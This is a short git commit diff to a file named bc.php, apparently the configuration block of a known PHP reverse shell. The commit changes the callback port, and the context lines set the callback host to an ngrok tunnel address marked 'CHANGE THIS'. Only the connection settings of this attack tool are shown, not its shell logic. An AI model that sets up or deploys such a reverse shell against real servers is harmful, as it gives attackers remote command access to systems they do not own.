c3bec14b7accbf621c2154c216c46bed33d4dda3
ryntax <ryntax404@gmail.com>
2020-04-12 05:26:27 +0700

    Update bc.php

--- bc.php
+++ bc.php
@@ -47,7 +47,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '0.tcp.ngrok.io';  // CHANGE THIS
-$port = 11854;       // CHANGE THIS
+$port = 19073;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
